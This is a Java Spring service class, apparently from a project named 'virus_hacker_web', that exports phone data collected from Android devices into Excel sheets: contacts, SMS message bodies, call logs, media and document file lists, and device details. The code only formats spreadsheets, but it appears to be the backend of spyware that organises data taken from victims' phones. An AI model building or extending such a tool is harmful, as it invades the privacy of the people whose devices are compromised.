package com.tools.virus_hacker_web.service;

import com.tools.virus_hacker_web.dto.*;
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.springframework.stereotype.Service;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

@Service
public class ExcelService {

    private static final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    /**
     * 모든 데이터를 하나의 엑셀 파일에 여러 시트로 저장
     */
    public void createComprehensiveExcel(CollectedData data, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            
            // 연락처 시트
            if (data.getContacts() != null && !data.getContacts().isEmpty()) {
                createContactsSheet(workbook, data.getContacts());
            }

            // SMS 시트
            if (data.getSms() != null && !data.getSms().isEmpty()) {
                createSmsSheet(workbook, data.getSms());
            }

            // 통화기록 시트
            if (data.getCallLogs() != null && !data.getCallLogs().isEmpty()) {
                createCallLogsSheet(workbook, data.getCallLogs());
            }

            // 미디어파일 시트
            if (data.getMediaFiles() != null && !data.getMediaFiles().isEmpty()) {
                createMediaFilesSheet(workbook, data.getMediaFiles());
            }

            // 문서 시트
            if (data.getDocuments() != null && !data.getDocuments().isEmpty()) {
                createDocumentsSheet(workbook, data.getDocuments());
            }

            // 기기정보 시트
            if (data.getDeviceInfo() != null) {
                createDeviceInfoSheet(workbook, data.getDeviceInfo());
            }

            // 모든 시트의 컬럼 너비 자동 조정
            for (int i = 0; i < workbook.getNumberOfSheets(); i++) {
                Sheet sheet = workbook.getSheetAt(i);
                if (sheet.getRow(0) != null) {
                    int lastCellNum = sheet.getRow(0).getLastCellNum();
                    for (int j = 0; j < lastCellNum; j++) {
                        sheet.autoSizeColumn(j);
                    }
                }
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    private void createContactsSheet(Workbook workbook, List<ContactInfo> contacts) {
        Sheet sheet = workbook.createSheet("연락처");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "이름", workbook);
        createCell(headerRow, 1, "전화번호", workbook);
        createCell(headerRow, 2, "이메일", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        for (ContactInfo contact : contacts) {
            Row row = sheet.createRow(rowNum++);
            createCell(row, 0, contact.getName(), workbook);
            createCell(row, 1, contact.getPhone(), workbook);
            createCell(row, 2, contact.getEmail(), workbook);
        }
    }

    private void createSmsSheet(Workbook workbook, List<SmsInfo> smsList) {
        Sheet sheet = workbook.createSheet("SMS");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "주소", workbook);
        createCell(headerRow, 1, "내용", workbook);
        createCell(headerRow, 2, "날짜", workbook);
        createCell(headerRow, 3, "타입", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        for (SmsInfo sms : smsList) {
            Row row = sheet.createRow(rowNum++);
            createCell(row, 0, sms.getAddress(), workbook);
            createCell(row, 1, sms.getBody(), workbook);
            createCell(row, 2, formatDate(sms.getDate()), workbook);
            createCell(row, 3, sms.getType(), workbook);
        }
    }

    private void createCallLogsSheet(Workbook workbook, List<CallLogInfo> callLogs) {
        Sheet sheet = workbook.createSheet("통화기록");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "번호", workbook);
        createCell(headerRow, 1, "이름", workbook);
        createCell(headerRow, 2, "날짜", workbook);
        createCell(headerRow, 3, "통화시간(초)", workbook);
        createCell(headerRow, 4, "타입", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        for (CallLogInfo callLog : callLogs) {
            Row row = sheet.createRow(rowNum++);
            createCell(row, 0, callLog.getNumber(), workbook);
            createCell(row, 1, callLog.getName(), workbook);
            createCell(row, 2, formatDate(callLog.getDate()), workbook);
            createCell(row, 3, callLog.getDuration() != null ? callLog.getDuration().toString() : "", workbook);
            createCell(row, 4, callLog.getType(), workbook);
        }
    }

    private void createMediaFilesSheet(Workbook workbook, List<MediaFileInfo> mediaFiles) {
        Sheet sheet = workbook.createSheet("미디어파일");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "경로", workbook);
        createCell(headerRow, 1, "이름", workbook);
        createCell(headerRow, 2, "크기(바이트)", workbook);
        createCell(headerRow, 3, "MIME 타입", workbook);
        createCell(headerRow, 4, "추가일", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        for (MediaFileInfo mediaFile : mediaFiles) {
            Row row = sheet.createRow(rowNum++);
            createCell(row, 0, mediaFile.getPath(), workbook);
            createCell(row, 1, mediaFile.getName(), workbook);
            createCell(row, 2, mediaFile.getSize() != null ? mediaFile.getSize().toString() : "", workbook);
            createCell(row, 3, mediaFile.getMimeType(), workbook);
            createCell(row, 4, formatDate(mediaFile.getDateAdded()), workbook);
        }
    }

    private void createDocumentsSheet(Workbook workbook, List<DocumentInfo> documents) {
        Sheet sheet = workbook.createSheet("문서");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "경로", workbook);
        createCell(headerRow, 1, "이름", workbook);
        createCell(headerRow, 2, "크기(바이트)", workbook);
        createCell(headerRow, 3, "MIME 타입", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        for (DocumentInfo document : documents) {
            Row row = sheet.createRow(rowNum++);
            createCell(row, 0, document.getPath(), workbook);
            createCell(row, 1, document.getName(), workbook);
            createCell(row, 2, document.getSize() != null ? document.getSize().toString() : "", workbook);
            createCell(row, 3, document.getMimeType(), workbook);
        }
    }

    private void createDeviceInfoSheet(Workbook workbook, DeviceInfo deviceInfo) {
        Sheet sheet = workbook.createSheet("기기정보");

        // 헤더 생성
        Row headerRow = sheet.createRow(0);
        createCell(headerRow, 0, "항목", workbook);
        createCell(headerRow, 1, "값", workbook);

        // 데이터 행 생성
        int rowNum = 1;
        createDataRow(sheet, rowNum++, "모델", deviceInfo.getModel(), workbook);
        createDataRow(sheet, rowNum++, "제조사", deviceInfo.getManufacturer(), workbook);
        createDataRow(sheet, rowNum++, "안드로이드 버전", deviceInfo.getAndroidVersion(), workbook);
        createDataRow(sheet, rowNum++, "SDK 버전", deviceInfo.getSdkVersion() != null ? deviceInfo.getSdkVersion().toString() : "", workbook);
    }

    public void createContactsExcel(List<ContactInfo> contacts, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("연락처");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "이름", workbook);
            createCell(headerRow, 1, "전화번호", workbook);
            createCell(headerRow, 2, "이메일", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            for (ContactInfo contact : contacts) {
                Row row = sheet.createRow(rowNum++);
                createCell(row, 0, contact.getName(), workbook);
                createCell(row, 1, contact.getPhone(), workbook);
                createCell(row, 2, contact.getEmail(), workbook);
            }

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 3; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    public void createSmsExcel(List<SmsInfo> smsList, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("SMS");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "주소", workbook);
            createCell(headerRow, 1, "내용", workbook);
            createCell(headerRow, 2, "날짜", workbook);
            createCell(headerRow, 3, "타입", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            for (SmsInfo sms : smsList) {
                Row row = sheet.createRow(rowNum++);
                createCell(row, 0, sms.getAddress(), workbook);
                createCell(row, 1, sms.getBody(), workbook);
                createCell(row, 2, formatDate(sms.getDate()), workbook);
                createCell(row, 3, sms.getType(), workbook);
            }

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 4; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    public void createCallLogsExcel(List<CallLogInfo> callLogs, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("통화기록");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "번호", workbook);
            createCell(headerRow, 1, "이름", workbook);
            createCell(headerRow, 2, "날짜", workbook);
            createCell(headerRow, 3, "통화시간(초)", workbook);
            createCell(headerRow, 4, "타입", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            for (CallLogInfo callLog : callLogs) {
                Row row = sheet.createRow(rowNum++);
                createCell(row, 0, callLog.getNumber(), workbook);
                createCell(row, 1, callLog.getName(), workbook);
                createCell(row, 2, formatDate(callLog.getDate()), workbook);
                createCell(row, 3, callLog.getDuration() != null ? callLog.getDuration().toString() : "", workbook);
                createCell(row, 4, callLog.getType(), workbook);
            }

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 5; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    public void createMediaFilesExcel(List<MediaFileInfo> mediaFiles, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("미디어파일");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "경로", workbook);
            createCell(headerRow, 1, "이름", workbook);
            createCell(headerRow, 2, "크기(바이트)", workbook);
            createCell(headerRow, 3, "MIME 타입", workbook);
            createCell(headerRow, 4, "추가일", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            for (MediaFileInfo mediaFile : mediaFiles) {
                Row row = sheet.createRow(rowNum++);
                createCell(row, 0, mediaFile.getPath(), workbook);
                createCell(row, 1, mediaFile.getName(), workbook);
                createCell(row, 2, mediaFile.getSize() != null ? mediaFile.getSize().toString() : "", workbook);
                createCell(row, 3, mediaFile.getMimeType(), workbook);
                createCell(row, 4, formatDate(mediaFile.getDateAdded()), workbook);
            }

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 5; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    public void createDocumentsExcel(List<DocumentInfo> documents, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("문서");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "경로", workbook);
            createCell(headerRow, 1, "이름", workbook);
            createCell(headerRow, 2, "크기(바이트)", workbook);
            createCell(headerRow, 3, "MIME 타입", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            for (DocumentInfo document : documents) {
                Row row = sheet.createRow(rowNum++);
                createCell(row, 0, document.getPath(), workbook);
                createCell(row, 1, document.getName(), workbook);
                createCell(row, 2, document.getSize() != null ? document.getSize().toString() : "", workbook);
                createCell(row, 3, document.getMimeType(), workbook);
            }

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 4; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    public void createDeviceInfoExcel(DeviceInfo deviceInfo, Path filePath) throws IOException {
        try (Workbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("기기정보");

            // 헤더 생성
            Row headerRow = sheet.createRow(0);
            createCell(headerRow, 0, "항목", workbook);
            createCell(headerRow, 1, "값", workbook);

            // 데이터 행 생성
            int rowNum = 1;
            createDataRow(sheet, rowNum++, "모델", deviceInfo.getModel(), workbook);
            createDataRow(sheet, rowNum++, "제조사", deviceInfo.getManufacturer(), workbook);
            createDataRow(sheet, rowNum++, "안드로이드 버전", deviceInfo.getAndroidVersion(), workbook);
            createDataRow(sheet, rowNum++, "SDK 버전", deviceInfo.getSdkVersion() != null ? deviceInfo.getSdkVersion().toString() : "", workbook);

            // 컬럼 너비 자동 조정
            for (int i = 0; i < 2; i++) {
                sheet.autoSizeColumn(i);
            }

            // 파일 저장
            try (FileOutputStream outputStream = new FileOutputStream(filePath.toFile())) {
                workbook.write(outputStream);
            }
        }
    }

    private void createDataRow(Sheet sheet, int rowNum, String label, String value, Workbook workbook) {
        Row row = sheet.createRow(rowNum);
        createCell(row, 0, label, workbook);
        createCell(row, 1, value, workbook);
    }

    private void createCell(Row row, int column, String value, Workbook workbook) {
        Cell cell = row.createCell(column);
        if (value != null) {
            cell.setCellValue(value);
        } else {
            cell.setCellValue("");
        }
        
        // 헤더 스타일 적용
        if (row.getRowNum() == 0) {
            CellStyle headerStyle = workbook.createCellStyle();
            Font headerFont = workbook.createFont();
            headerFont.setBold(true);
            headerStyle.setFont(headerFont);
            headerStyle.setFillForegroundColor(IndexedColors.GREY_25_PERCENT.getIndex());
            headerStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);
            cell.setCellStyle(headerStyle);
        }
    }

    private String formatDate(Long timestamp) {
        if (timestamp == null) {
            return "";
        }
        return dateFormat.format(new Date(timestamp));
    }
}

